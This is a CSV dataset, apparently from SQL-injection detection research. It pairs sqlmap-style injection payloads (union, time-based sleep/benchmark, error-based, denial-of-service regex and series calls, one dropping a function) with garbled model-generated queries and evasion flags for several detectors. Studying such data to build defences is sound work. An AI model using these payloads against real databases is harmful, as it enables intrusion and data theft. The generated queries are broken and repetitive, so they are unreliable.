,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
2891,"1"") where 8878=8878 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--","SELECT * FROM SQL_injection, SELECT * FROM (SELECT * FROM (SELECT * FROM */ex_schema.character_sets) FROM SQL_injection) AS :__percentage FROM information_schema.character_sets WHERE 8878 = 8878 OR (SELECT 9173 FROM(select) -->) FROM SQL_injection)",0,1,0,0,1,0,0
2892,"1"") or 8514=benchmark(5000000,md5(0x544d5a4c))#",SELECT MIN(0x544d5a4c) FROM SQL injections,1,1,0,1,1,1,0
2893,"1)) union all select null,null,null,null,null,null#","SELECT null,null,null FROM SQL - SELECT MIN(null) FROM SQL - injection_detecting",1,1,1,1,1,1,1
2894,1') where 5307=5307;waitfor delay '0:0:5'--,SELECT MIN(delay) FROM SQL injection detection,1,0,0,1,1,1,0
2895,-8086%') or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('%'=',SELECT MIN(case) FROM SQL_inaddr.get_host_address(chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(109) FROM SQL injection detection WHERE NOT'sql injection' IN (SELECT MIN(%'=),0,1,0,0,1,0,0
2896,1'))) and 5615=5458--,SELECT MIN(5458--) FROM SQL injection detection,1,1,0,1,1,1,0
2897,"1"")) order by 1#",SELECT MIN(1#) FROM SQL injection detection,1,1,1,0,1,1,0
2898,"-4033')) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('ouup'='ouup",SELECT DISTINCT t1.ouup FROM SQL_injection AS t1 JOIN database()() JOIN Query: -4033') OR t1.select ='sq injection detection',0,1,0,0,1,0,0
2899,"1) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (8529=8529","SELECT * FROM SQL_injection, COUNT(*) FROM SQL_injection) FROM SQL_injection",1,1,1,1,1,1,1
2900,1' where 2958=2958;if(6647=2179) select 6647 else drop function zvlq--,SELECT 6647 = 2179,1,1,1,1,0,1,0
2901,"1' where 8360=8360 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",SELECT MIN(sql) FROM SQL injection_message WHERE 8360 = 8360 OR 7427 = dbms_pipe.receive_message(chr(87)||chr(109),1,1,0,0,1,0,0
2902,"1%'));select count(*) from generate_series(1,5000000)--","SELECT COUNT(*) FROM generate_series(1,5000000)-- SELECT MIN(1,5000000) FROM SQL injection detection",1,1,0,0,1,0,0
2903,-8234'))) or 9323=9323#,SELECT MIN(9323 = 9323 = 9323,1,1,0,0,0,0,0
2904,"1') where 5378=5378;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--","SELECT dbms_pipe.receive_message(chr(67)||chr(101), if FROM SQL injection_message WHERE NOT SELECT SQL_injection_message = ""5378 = 5378;select dbms_pipe.receive_message(chr(67)||chr(101),5) FROM SQL_injection",1,1,0,0,1,0,0
2905,"-5798"" or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",SELECT MIN(5023 = ctxsys.drithsx.sn(5023 = ctxsys.drithsx.sn(5023 = ctxsys.drithsx.sn(5023 = ctxsys.drith(5023)|chr(5023) FROM SQL injection),1,1,0,0,0,0,0
2906,1))) rlike (select (case when (4367=6879) then 1 else 0x28 end)) and (((2542=2542,SELECT (SELECT case FROM SQL injection detection) AND NOT (((2542 = 2542),0,1,0,0,1,0,0
2907,"1'))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('bfrq' like 'bfrq","SELECT SUM(*) FROM SQL injection detection WHERE NOT rdb$types as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) AND ((((*) = 'bfrq')",1,1,0,0,0,0,0
2908,"1%"") and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",SELECT DISTINCT % FROM SQL injection detection,1,0,1,1,1,1,1
2909,-4901) or 3407=6442#,SELECT * FROM query: -4901) ORDER BY query: 3407 = 6442#,1,1,1,1,1,1,1
2910,1 and (select * from (select(sleep(5)))gcrr)#,SELECT MIN(select(select(5)))gcrr) FROM SQL injection,1,1,0,0,1,0,0
2911,"1%""))) and 9198=9198--",SELECT MIN(9198_-) FROM SQL injection detection,0,1,1,1,1,1,1
2912,"-1868)) union all select 1859,1859--","SELECT MIN(1859,1859--) FROM SQL injections WHERE NOT SELECT MIN(1859 - Deleted) FROM SQL_Injection",1,1,1,1,1,1,1
2913,1' and 2908=8067--,SELECT MIN(sql injection) FROM SQL SELECT SELECT MIN(sql injection) FROM query: 1' AND 2908 = 8067--,1,1,1,0,1,1,0
2914,"-4418"" or 6872=6872 and ""gbut""=""gbut","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT -4418 = 'Query: -4418' OR 6872 = 6872 AND ""gbut"" = 'gbut'",1,1,0,0,0,0,0
2915,"1"" where 4319=4319;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",SELECT SUM(*) FROM SQL injection detection,1,0,1,1,1,1,1
2916,"1')) union all select null,null,null,null--","SELECT null,null,null,null-- FROM SQL SELECT MIN(sql injection detection) FROM SQL SELECT MIN(sql injection detection) FROM SQL",1,1,1,1,1,1,1
2917,1'||(select 'ytwz' from dual where 3025=3025 and (5039=5303)*5303)||',SELECT MIN(5039 = 5303)||' FROM SQL injection detection,0,1,0,0,1,0,0
2918,"1%' or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",SELECT MIN(sql injection) FROM SQL_injection,1,1,1,1,1,1,1
2919,"1""))) and 9198=9198--","SELECT MIN(998, - Deleted FROM SQL SELECT MIN(998, MIN(998, - 998) FROM SQL injection detection",1,1,1,1,1,1,1
2920,"iif(1539=1539,1539,1/0)","SELECT NOT iif(1539 = 1539,1539,1/0) FROM SQL AS t1 JOIN query: iif(1539 = 1539 WHERE NOT is_injected = ""valid""",0,1,0,0,0,0,0
2921,"1' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)","SELECT MIN(repeat(right(9981),5000000000) FROM SQL injection_detecting",1,1,0,0,1,0,0
2922,"1%"")) and (3020=3020)*6703 and ((""%""=""",SELECT MIN(((((((((((((((((((((((((()%)) FROM SQL injection detection) FROM SQL injection detection),1,1,0,0,1,0,0
2923,"1%""))) rlike sleep(5)#",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
2924,"1'))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((('xwhi'='xwhi",SELECT DISTINCT (((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((())) FROM SQL injection)) ORDER BY SELECT MIN((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((())) FROM SQL injection))),1,1,0,0,0,0,0
2925,-9355' or 6872=6872 and 'mztk'='mztk,"SELECT MIN(sql injection) FROM SQL SELECT -9355', 6872 = 6872 AND'mztk='mztk' = 'evade sq injection detection'",1,1,0,0,0,0,0
2926,"-5198))) union all select 7089,7089,7089,7089,7089,7089,7089,7089#","SELECT MIN(7089,7089,7089,7089,7089# FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM Query: -5198)",1,1,1,1,1,1,1
2927,"1 where 7254=7254;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",SELECT MIN(sleep) FROM SQL injection detection,1,0,0,1,1,1,0
2928,"1"";select (case when (3855=3855) then 3855 else 1/(select 0) end)--",SELECT 1/(select 0) end) FROM SQL injection detection,1,1,0,0,1,0,0
2929,"1));select benchmark(5000000,md5(0x714e4153))#","SELECT 5000000,md5(0x714e4153) FROM SQL injection_description",1,1,0,1,1,1,0
2930,"1')));select * from generate_series(7754,7754,case when (7754=1252) then 1 else 0 end) limit 1--",SELECT * FROM generate_series WHERE NOT SQL_injection_method_code ='sq injection' ORDER BY case LIMIT 1,0,0,1,1,0,1,0
2931,"1%"") order by 1#",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
2932,"1 where 4091=4091;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--","SELECT * FROM SQL injection detection WHERE NOT domain.domain.columns = ""t1, domain.tables as t3--""",1,1,1,0,0,0,0
2933,1) union all select null--,SELECT MIN(sql injection) FROM SQL SELECT SELECT DISTINCT null-- FROM SQL,1,1,1,1,1,1,1
2934,1' rlike (select (case when (7689=7689) then 1 else 0x28 end)) and 'hyun' like 'hyun,"SELECT MIN(case) FROM SQL injection detection) FROM SQL SELECT MIN(case) FROM SQL SELECT MIN(case) FROM query: 1' rlike (select) FROM query: 1' rlike (select) FROM SQL injection detection) AND NOT jyun = ""hyun""",0,1,0,0,1,0,0
2935,"1"") as cnrh where 8524=8524 and 3824=benchmark(5000000,md5(0x76555642))--","SELECT MIN(0x76555642) FROM SQL injection detection WHERE cnrh = 8524 = 8524 AND 3824 = benchmark(5000000,md5(0x76555642)",1,1,0,0,1,0,0
2936,"-5027%"")) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((""%""=""",SELECT MIN((((((((((((((((((((((((((((((((((())) FROM SQL injection)) ORDER BY 5903,1,1,0,0,0,0,0
2937,"1%"" and 7533=7533 and ""%""=""",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
2938,"1' where 5547=5547;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--","SELECT * FROM SQL injection detection WHERE NOT domain.domain.columns = ""t1, domain.tables as t3--""",1,1,1,0,0,0,0
2939,"1"")) and 8407=(select count(*) from generate_series(1,5000000)) and ((""tfrs""=""tfrs","SELECT tfrs(*) FROM query_series(1,5000000) AND NOT tfrs_=""tfrs"" = ""sql injection detection""",1,1,0,0,1,0,0
2940,1') where 1369=1369 and 4840=1697#,SELECT MIN(sql injection) FROM SQL SELECT MIN(1369 = 1369 AND 4840 = 1697#),1,1,1,0,0,0,0
2941,"1' where 7417=7417 and 8407=(select count(*) from generate_series(1,5000000))--","SELECT MIN(*) FROM SQL_injections WHERE 7417 = 7417 AND 8407 =(select count(*) FROM generate_series(1,5000000)",1,1,0,0,0,0,0
2942,"-1510"") as rqrv where 4507=4507 union all select 4507,4507,4507,4507,4507--",SELECT MIN(sqrv) FROM SQL injection detection,1,1,1,1,1,1,1
2943,"-8609%""))) union all select 6021,6021,6021,6021,6021,6021--","SELECT MIN(6021,6021,6021--) FROM SQL injection_diagnoses WHERE NOT SELECT MIN(sql injection) FROM Query: -8609%))",1,1,0,0,1,0,0
2944,"1'||(select 'glec' from dual where 4846=4846;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",SELECT 'glec' FROM SQL injection_diagnosis',1,0,1,1,1,1,1
2945,1) as hlcn where 1165=1165 rlike (select * from (select(sleep(5)))vwyq)#,SELECT MIN(select(sleep(5)) FROM SQL injection detection) FROM SQL SELECT MIN(select(select) FROM (SELECT SUM(select) FROM (SELECT SUM(select) FROM SQL) AS rlike WHERE NOT rlike = '1165=1165 rlike') FROM (SELECT SUM(select(select(sleep(5))) FROM (SELECT SUM(select_select) FROM SQL injection) as rlike (select_injection) FROM SELECT SELECT SELECT MIN(select(select(select(select) FROM SQL) AS t1 WHERE t1.select(select(select(select) FROM (SELECT SUM(select(select) FROM (SELECT SUM(select(select(select) FROM SQL) AS t2 WHERE t1.select(select(select(,1,1,0,0,1,0,0
2946,"1')) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('ykoz'='ykoz","SELECT * FROM SQL_injection WHERE NOT rdb$types = 't2,rdb$collations as t3,rdb$functions as t4) OR (SELECT * FROM rdb$fields as t2,rdb$collations as t3,rdb$functions as t4) ORDER BY *(*)",0,1,0,0,0,0,0
2947,"1"" and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""hvwv""=""hvwv","SELECT * FROM sysibm.systables as t2,sysibm.systables as t3) and hvwv = 'hvwv'",1,1,0,0,0,0,0
2948,"1"") as tecq where 4817=4817 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","SELECT tecq_diagnosis FROM SQL_INSERT JOIN sysibm.systables as t2,sysibm.systables as t3)-- SELECT tecq FROM sysibm.systables as t2,sysibm.systables as t3)-- SELECT tecq FROM sysibm.systables as t3)-- SELECT SUM(*) FROM SQL injection'",0,1,0,0,0,0,0
2949,"1',(select (case when (1902=5536) then 1 else 1902*(select 1902 from master..sysdatabases) end))","SELECT MIN(select) FROM SQL injection_detective WHERE NOT SQL_injection = ""Date""",0,0,0,0,1,0,0
2950,1') where 5680=5680 and (3020=3020)*6703--,SELECT MIN(sql injection) FROM SQL SELECT MIN(5680 = 5680) FROM Query: 1',1,1,0,0,1,0,0
2951,"1%"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (((""%""=""","SELECT * FROM sysibm.systables as t2,sysibm.systables as t3 AND (((((((((((((((())) FROM SQL injection detection)",1,1,0,0,0,0,0
2952,"1"") and 8407=(select count(*) from generate_series(1,5000000)) and (""wmmg"" like ""wmmg","SELECT DISTINCT wmmg FROM query_series(1,5000000) AND NOT wmmg = ""wmmg""",1,1,0,0,1,0,0
2953,"1%"");(select * from (select(sleep(5)))acdk)#",SELECT * FROM (SELECT SUM(select(sleep(5))) FROM SQL injection detection),1,1,0,0,1,0,0
2954,"1"";select benchmark(5000000,md5(0x4c4d6142)) and ""azzv"" like ""azzv","SELECT MIN(0x4c4d6142) FROM ""sql injection detection""",1,1,1,0,1,1,0
2955,1') rlike (select * from (select(sleep(5)))sgvo),SELECT MIN(select(sleep(5))sgvo) FROM SQL injection_detective WHERE NOT syst_injection_method_code ='sq injection',1,1,0,0,1,0,0
2956,"-2364'+(select 'qdut' where 7560=7560 union all select 7560,7560,7560,7560,7560--",SELECT MIN(select) FROM SQL injection detection,0,0,0,1,1,1,0
2957,"1')) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",SELECT MIN(sql injection) FROM SQL_injection),1,1,1,1,1,1,1
2958,"1') as tsge where 6970=6970;select count(*) from generate_series(1,5000000)--","SELECT MIN(*) FROM generate_series(1,5000000) AS __execut_from SQL injection detection",1,1,0,0,1,0,0
2959,"1%""))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (((""%""=""",SELECT * FROM SQL_injector WHERE NOT md5(0x52515a50)),1,1,0,0,1,0,0
2960,"1"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--","SELECT COUNT(*) FROM rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1,1,0,0,0,0,0
2961,"1' where 4945=4945;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",SELECT MIN(repeat(left(crypt_key)||char(69) FROM SQL injection) FROM SQL SELECT MIN(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(crypt)) FROM SELECT SQL_injection) FROM SELECT SELECT MIN(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat) FROM SQL injection),1,1,0,0,1,0,0
2962,"1%')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('%'='",SELECT (SELECT case FROM SQL_injection) AND (%'=) FROM SQL_injection),0,1,0,0,1,0,0
2963,1%';select (case when (9490=6134) then 9490 else cast(1 as int)/(select 0 from dual) end) from dual--,SELECT MIN(case) FROM SQL injection detection,0,0,1,1,1,1,1
2964,-1375'))) or (1226=9648)*9648 and ((('kfoy' like 'kfoy,SELECT DISTINCT t1.((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((())) FROM SQL injection)) FROM SQL injection) ORDER BY COUNT(*) DESC LIMIT 1),1,1,0,0,0,0,0
2965,"-8046""))) union all select 3126,3126,3126,3126,3126,3126,3126,3126,3126#",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT DISTINCT -8046)),1,1,0,1,1,1,0
2966,"1'||(select 'mgel' where 3591=3591 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))||'",SELECT MIN(6055 = 6055) FROM SQL injection detection WHERE'sql injection' ='sq injection',1,1,0,0,1,0,0
2967,1) and 4595=4595#,"SELECT * FROM query: 1 AND NOT SQL_inject = ""valid""",1,1,1,0,1,1,0
2968,"1%"")) and 2388=benchmark(5000000,md5(0x6d457153))#",SELECT MIN(0x6d457153) FROM SQL injections,1,1,1,1,1,1,1
2969,"1"")) and make_set(8266=9226,9226) and ((""omjx"" like ""omjx","SELECT DISTINCT omjx, COUNT(omjx) FROM SQL injection_detection",1,1,1,1,1,1,1
2970,"1');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3","SELECT * FROM SQL injection detection WHERE NOT domain.domain.columns = ""t1,"" ORDER BY domain.tables as t3",1,1,1,1,0,1,0
2971,"-9959"") or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""vcwc""=""vcwc","SELECT vcwc FROM SQL_injection, COUNT(*) FROM SQL_injection) AND NOT vcwc = 4747 = dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(113)||chr(112) or SQL_injection.sqlid_to_sqlhash(sqlid_to_sqlhash(sqlid_to_sqlhash((chr(4747 = dbms_utility.sqlid_to_sqlhash((chr(113)||chr(112)",1,1,0,0,0,0,0
2972,1'));waitfor delay '0:0:5' and (('yjsp' like 'yjsp,SELECT MIN(duration) FROM SQL injection detection,1,0,1,1,1,1,1
2973,"-1059"") union all select 1276,1276,1276,1276,1276,1276,1276,1276#",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT MIN(sql injection) FROM Query: -1059,1,1,1,1,1,1,1
2974,"1"") where 4180=4180 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--","SELECT MIN(repeat(right(5389),5000000000) FROM SQL injection_detecting WHERE NOT null_injection = 4180 = 4180 ORDER BY char(68)||char(85)",1,1,0,0,1,0,0
2975,"1%')) union all select null,null,null,null,null,null--",SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
2976,-9653') where 2705=2705 or 9323=9323#,SELECT MIN(sql injection) FROM SQL_injection WHERE 2705 = 2705 = 2705 OR 9323 = 9323 = 9323,1,1,0,0,0,0,0
2977,1%') order by 1--,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
2978,"-4694') where 1501=1501 union all select 1501,1501,1501,1501,1501,1501#",SELECT MIN(SQL) FROM SQL injection detection,1,0,1,1,1,1,1
2979,"1))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((1402=1402",SELECT ((1402) FROM SQL injection detection) FROM (SELECT MIN(((1402) FROM SQL) FROM (SELECT MIN(((1402) FROM SQL),1,1,0,0,1,0,0
2980,"1'))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((('fvbv'='fvbv","SELECT t1.select, t1.select FROM SQL_injection AS t1 JOIN (SELECT SUM(select) FROM SQL_injection) AS t2 ON t1.select = t2.select 8488 union select 3051 union select 1210)a group by t1.select &(select) FROM SQL JOIN (SELECT SUM(select) FROM SELECT SUM(select) FROM SELECT SUM(select) FROM SELECT SUM(select,'sql injection) FROM SQL SELECT SUM(select) FROM SELECT SUM(select) FROM SELECT SUM(select) FROM SELECT SUM(select) FROM SQL JOIN 3051 union select 3051 union select 1210)amount,'select & t1.select) FROM SQL JOIN (SELECT SUM(select) FROM t2.select / fvbv','sq",0,1,0,0,1,0,0
2981,"1"")));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((""yzjl"" like ""yzjl","SELECT DISTINCT t1.((((((((((((((((((()) FROM regexp_substring(repeat(right(char(3702),0) FROM reexp_substring(repeat(right(char(3702),0) FROM SQL injection detection) AS t1 JOIN (SELECT SUM(repeat(right(char(3702),500000000) FROM query: 1""))",1,1,0,0,1,0,0
